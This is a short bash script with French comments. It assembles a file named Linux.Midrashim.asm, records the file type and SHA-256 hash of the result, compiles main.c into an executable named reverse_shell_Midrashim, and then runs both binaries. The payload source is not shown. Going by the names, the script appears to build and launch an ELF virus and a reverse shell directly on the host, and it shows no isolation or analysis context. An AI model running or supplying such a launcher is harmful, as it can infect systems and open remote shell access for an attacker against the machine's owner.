#!/bin/bash

# Assembler le fichier ASM avec fasm
echo "Assembling Linux.Midrashim.asm..."
fasm Linux.Midrashim.asm

# Vérifier le type du fichier généré
echo "Checking file type of Linux.Midrashim..."
file Linux.Midrashim

# Calculer le SHA-256 du fichier généré
echo "Calculating SHA-256 checksum of Linux.Midrashim..."
sha256sum Linux.Midrashim

# Compiler le fichier C avec gcc
echo "Compiling main.c with reverse_shell_Midrashim..."
gcc main.c -o reverse_shell_Midrashim

# Exécuter l'exécutable généré par l'assemblage
echo "Running Linux.Midrashim..."
./Linux.Midrashim

# Exécuter l'exécutable généré par la compilation C
echo "Running reverse_shell_Midrashim..."
./reverse_shell_Midrashim

echo "Done."
